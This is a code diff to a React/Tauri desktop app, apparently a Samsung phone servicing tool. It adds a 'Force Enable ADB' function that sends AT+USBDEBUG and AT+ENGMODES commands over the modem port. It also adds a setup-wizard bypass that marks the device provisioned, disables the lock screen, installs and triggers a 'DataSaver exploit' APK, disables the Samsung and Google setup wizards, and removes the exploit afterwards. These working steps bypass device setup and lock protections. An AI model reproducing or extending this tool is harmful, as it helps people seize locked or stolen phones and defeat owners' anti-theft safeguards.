@@ -11,6 +11,8 @@ export default function App() {
   const [ssid, setSsid] = useState("2");
   const [password, setPassword] = useState("1234qwer");
   const [logExpanded, setLogExpanded] = useState(true);
+  const [serialPorts, setSerialPorts] = useState<string[]>([]);
+  const [selectedPort, setSelectedPort] = useState("");
 
   const appendLog = (msg: string) => setLogs(prev => [...prev, msg]);
 
@@ -20,16 +22,44 @@ export default function App() {
 
   const refreshDevices = async () => {
     setLoading(true);
-    appendLog("Scanning devices...");
+    appendLog("Scanning ADB devices...");
     try {
-      const version: string = await invoke("get_adb_version");
-      appendLog(version);
       const list: string[] = await invoke("get_devices");
       setDevices(list);
       if (devices.length === 0) setSelectedDevices(list);
-      appendLog(`Found ${list.length} device(s)`);
+      appendLog(`Found ${list.length} ADB device(s)`);
     } catch (e: any) {
       appendLog(`ERROR: ${e}`);
+    }
+
+    appendLog("Scanning COM ports...");
+    try {
+      const ports: string[] = await invoke("get_serial_ports");
+      setSerialPorts(ports);
+      if (ports.length > 0 && !selectedPort) setSelectedPort(ports[0]);
+      appendLog(`Found ${ports.length} COM port(s)`);
+    } catch (e: any) {
+      appendLog(`ERROR: ${e}`);
+    }
+    setLoading(false);
+  };
+
+  const sendAT = async () => {
+    if (!selectedPort) return;
+    setLoading(true);
+    setLogExpanded(true);
+    appendLog(`──── Sending AT Exploit to ${selectedPort} ────`);
+    try {
+      appendLog(`[${selectedPort}] Sending AT+USBDEBUG=1...`);
+      const resp1: string = await invoke("send_at_command", { portName: selectedPort, command: "AT+USBDEBUG=1" });
+      appendLog(`Resp: ${resp1}`);
+      await delay(1000);
+      appendLog(`[${selectedPort}] Sending AT+ENGMODES=1,2,0...`);
+      const resp2: string = await invoke("send_at_command", { portName: selectedPort, command: "AT+ENGMODES=1,2,0" });
+      appendLog(`Resp: ${resp2}`);
+      appendLog(`[${selectedPort}] ✓ Done. Now check 'adb devices'.`);
+    } catch (e: any) {
+      appendLog(`[${selectedPort}] ✗ ${e}`);
     }
     setLoading(false);
   };
@@ -54,24 +84,46 @@ export default function App() {
     if (selectedDevices.length === 0) return;
     setLoading(true);
     setLogExpanded(true);
-    appendLog("──── Skip Setup Wizard ────");
+    appendLog("──── FULL WZ SKIP (BOW ALGORITHM) ────");
+    
+    let appDir: string;
+    try { appDir = await invoke("get_app_dir"); } catch { appDir = "."; }
+    const sep = appDir.includes("\\") ? "\\" : "/";
+    const apkData = `${appDir}${sep}assets${sep}Data_Saver_Test-debug.apk`;
+    const apkDataTest = `${appDir}${sep}assets${sep}Data_Saver_Test-debug-androidTest.apk`;
+
     for (const dev of selectedDevices) {
-      appendLog(`[${dev}] Applying settings...`);
+      appendLog(`[${dev}] Step 1: Global & System Settings...`);
       try {
-        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put global stay_on_while_plugged_in 7"] }); await delay(300);
-        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put global device_provisioned 1"] }); await delay(300);
-        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put secure user_setup_complete 1"] }); await delay(300);
-        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put system samsung_eula_agree 1"] }); await delay(300);
-        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put system screen_off_timeout 600000"] }); await delay(300);
-        await invoke("run_adb", { args: ["-s", dev, "shell", "locksettings set-disabled true"] }); await delay(300);
-        appendLog(`[${dev}] Disabling setup wizards...`);
-        await invoke("run_adb", { args: ["-s", dev, "shell", "pm disable-user com.sec.android.app.SecSetupWizard"] }); await delay(300);
-        await invoke("run_adb", { args: ["-s", dev, "shell", "pm disable-user com.google.android.setupwizard"] }); await delay(300);
-        appendLog(`[${dev}] Sending HOME key...`);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put global stay_on_while_plugged_in 7"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put global device_provisioned 1"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put secure user_setup_complete 1"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put system samsung_eula_agree 1"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put system screen_off_timeout 600000"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "settings put system time_12_24 12"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "locksettings set-disabled true"] }); await delay(200);
+        
+        appendLog(`[${dev}] Step 2: Deploying DataSaver exploit...`);
+        await invoke("run_adb", { args: ["-s", dev, "install", "-r", apkData] }); await delay(500);
+        await invoke("run_adb", { args: ["-s", dev, "install", "-r", apkDataTest] }); await delay(500);
+        
+        appendLog(`[${dev}] Step 3: Triggering exploit...`);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "am instrument -w -m -e debug false -e class 'com.example.DataSaver.ExampleInstrumentedTest' com.example.DataSaver.test/androidx.test.runner.AndroidJUnitRunner"] });
+        await delay(1000);
+        
+        appendLog(`[${dev}] Step 4: Disabling Setup Wizards...`);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "pm disable-user com.sec.android.app.SecSetupWizard"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "shell", "pm disable-user com.google.android.setupwizard"] }); await delay(200);
+        
+        appendLog(`[${dev}] Step 5: Cleaning up...`);
+        await invoke("run_adb", { args: ["-s", dev, "uninstall", "com.example.DataSaver"] }); await delay(200);
+        await invoke("run_adb", { args: ["-s", dev, "uninstall", "com.example.DataSaver.test"] }); await delay(200);
+        
+        appendLog(`[${dev}] Step 6: Sending HOME key...`);
         await invoke("run_adb", { args: ["-s", dev, "shell", "input keyevent KEYCODE_HOME"] });
-        appendLog(`[${dev}] ✓ Done`);
+        appendLog(`[${dev}] ✓ SUCCESS`);
       } catch (e: any) {
-        appendLog(`[${dev}] ✗ ${e}`);
+        appendLog(`[${dev}] ✗ FAILED: ${e}`);
       }
     }
     appendLog("──── Complete ────");
@@ -82,24 +134,29 @@ export default function App() {
     if (selectedDevices.length === 0 || !ssid) return;
     setLoading(true);
     setLogExpanded(true);
-    appendLog(`──── WiFi: ${ssid} ────`);
+    appendLog(`──── WiFi Setup: ${ssid} ────`);
     let appDir: string;
     try { appDir = await invoke("get_app_dir"); } catch { appDir = "."; }
     const sep = appDir.includes("\\") ? "\\" : "/";
-    const apk = `${appDir}${sep}WifiUtil.apk`;
+    const apk = `${appDir}${sep}assets${sep}WifiUtil.apk`;
 
     for (const dev of selectedDevices) {
       try {
         appendLog(`[${dev}] Installing WifiUtil...`);
         await invoke("run_adb", { args: ["-s", dev, "install", "-r", apk] }); await delay(1000);
-        appendLog(`[${dev}] Configuring...`);
+        appendLog(`[${dev}] Configuring network...`);
         const method = password
           ? `am instrument -e method addWpaPskNetwork -e ssid "${ssid}" -e psk "${password}" -w com.android.tradefed.utils.wifi/.WifiUtil`
           : `am instrument -e method addOpenNetwork -e ssid "${ssid}" -w com.android.tradefed.utils.wifi/.WifiUtil`;
         await invoke("run_adb", { args: ["-s", dev, "shell", method] }); await delay(500);
-        appendLog(`[${dev}] Associating...`);
+        
+        appendLog(`[${dev}] Associating & Saving...`);
         await invoke("run_adb", { args: ["-s", dev, "shell", `am instrument -e method associateNetwork -e ssid "${ssid}" -w com.android.tradefed.utils.wifi/.WifiUtil`] }); await delay(500);
-        appendLog(`[${dev}] ✓ Connected`);
+        await invoke("run_adb", { args: ["-s", dev, "shell", `am instrument -e method saveConfiguration -w com.android.tradefed.utils.wifi/.WifiUtil`] }); await delay(500);
+        
+        appendLog(`[${dev}] Verifying connection...`);
+        const status: string = await invoke("run_adb", { args: ["-s", dev, "shell", "dumpsys wifi | grep mNetworkInfo"] });
+        appendLog(`[${dev}] Status: ${status.includes("CONNECTED/CONNECTED") ? "✓ Connected" : "⚠ Check HP"}`);
       } catch (e: any) {
         appendLog(`[${dev}] ✗ ${e}`);
       }
@@ -206,33 +263,73 @@ export default function App() {
                 />
               </div>
             </div>
-          </div>
+            {/* Actions */}
+            <section>
+              <h3 className="text-[13px] font-semibold mb-3 text-[var(--win-text-secondary)]">Actions</h3>
+              <div className="grid grid-cols-2 gap-4">
+                <button
+                  onClick={skipWz}
+                  disabled={loading || selectedDevices.length === 0}
+                  className="win-action-card"
+                >
+                  <div className="w-10 h-10 rounded-lg bg-[#0078d4] flex items-center justify-center">
+                    <Play className="w-5 h-5 text-white" />
+                  </div>
+                  <span className="text-[14px] font-semibold">Skip Setup Wizard</span>
+                  <span className="win-badge bg-[rgba(255,255,255,0.06)] text-[var(--win-text-tertiary)]">
+                    {selectedDevices.length} device(s)
+                  </span>
+                </button>
 
-          {/* ── ACTION CARDS ── */}
-          <div className="grid grid-cols-2 gap-4">
-            <button
-              onClick={skipWz}
-              disabled={loading || selectedDevices.length === 0}
-              className="win-action-card !p-8 hover:!bg-[rgba(255,255,255,0.02)] active:scale-[0.98]"
-            >
-              <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-[#0078d4] to-[#00c6ff] flex items-center justify-center shadow-lg mb-2">
-                <Play className="w-7 h-7 text-white fill-white" />
+                <button
+                  onClick={connectWifi}
+                  disabled={loading || selectedDevices.length === 0 || !ssid}
+                  className="win-action-card"
+                >
+                  <div className="w-10 h-10 rounded-lg bg-[#107c10] flex items-center justify-center">
+                    <Wifi className="w-5 h-5 text-white" />
+                  </div>
+                  <span className="text-[14px] font-semibold">Connect WiFi</span>
+                  <span className="win-badge bg-[rgba(255,255,255,0.06)] text-[var(--win-text-tertiary)]">
+                    {ssid || "No SSID"}
+                  </span>
+                </button>
               </div>
-              <span className="text-[16px] font-bold">Skip Setup Wizard</span>
-              <span className="text-[12px] text-[var(--win-text-tertiary)] mt-1">Full bypass algorithm</span>
-            </button>
+            </section>
 
-            <button
-              onClick={connectWifi}
-              disabled={loading || selectedDevices.length === 0 || !ssid}
-              className="win-action-card !p-8 hover:!bg-[rgba(255,255,255,0.02)] active:scale-[0.98]"
-            >
-              <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-[#107c10] to-[#27ae60] flex items-center justify-center shadow-lg mb-2">
-                <Wifi className="w-7 h-7 text-white" />
+            {/* ADB Exploit via COM */}
+            <section className="mt-6">
+              <h3 className="text-[13px] font-semibold mb-3 text-[var(--win-text-secondary)]">ADB Exploit (Virtual COM)</h3>
+              <div className="win-card p-5 bg-[rgba(255,165,0,0.05)] border-[rgba(255,165,0,0.2)]">
+                <div className="flex items-end gap-4">
+                  <div className="flex-1">
+                    <label className="block text-[12px] text-[var(--win-text-tertiary)] mb-2 uppercase tracking-tight font-bold">Select COM Port</label>
+                    <select
+                      value={selectedPort}
+                      onChange={e => setSelectedPort(e.target.value)}
+                      className="win-input !border-b-[var(--win-warning)] cursor-pointer"
+                    >
+                      {serialPorts.length === 0 ? (
+                        <option value="">No ports detected</option>
+                      ) : (
+                        serialPorts.map(p => <option key={p} value={p}>{p}</option>)
+                      )}
+                    </select>
+                  </div>
+                  <button
+                    onClick={sendAT}
+                    disabled={loading || !selectedPort}
+                    className="win-btn-accent !bg-[var(--win-warning)] !text-black hover:!opacity-90 flex items-center gap-2 h-[38px] px-6"
+                  >
+                    <Zap className="w-4 h-4" />
+                    Force Enable ADB
+                  </button>
+                </div>
+                <p className="text-[11px] text-[var(--win-text-disabled)] mt-3">
+                  Use this if 'adb devices' is empty. Requires Samsung Mobile USB Modem port.
+                </p>
               </div>
-              <span className="text-[16px] font-bold">Connect WiFi</span>
-              <span className="text-[12px] text-[var(--win-text-tertiary)] mt-1">Automatic provisioning</span>
-            </button>
+            </section>
           </div>
 
           {/* ── LOG PANEL ── */}
